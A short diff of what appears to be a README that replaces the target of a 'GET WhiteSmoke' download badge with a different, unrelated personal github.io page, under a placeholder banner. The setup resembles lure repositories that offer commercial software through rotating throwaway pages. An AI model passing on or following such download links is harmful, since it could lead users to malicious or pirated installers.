@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=9557d411bda3950427c4df24ad4da86fba542017-8356602-images-thumbs&n=13)
 
-[![GET WhiteSmoke](https://img.shields.io/badge/GET%20%E2%80%94%20WhiteSmoke-0078D6?style=for-the-badge&logoColor=white)](https://component-store-cleanup-tools.github.io/.github/whitesmoke-software)
+[![GET WhiteSmoke](https://img.shields.io/badge/GET%20%E2%80%94%20WhiteSmoke-0078D6?style=for-the-badge&logoColor=white)](https://samhornwfpv.github.io/.github/whitesmoke-software)
 
 ---
 
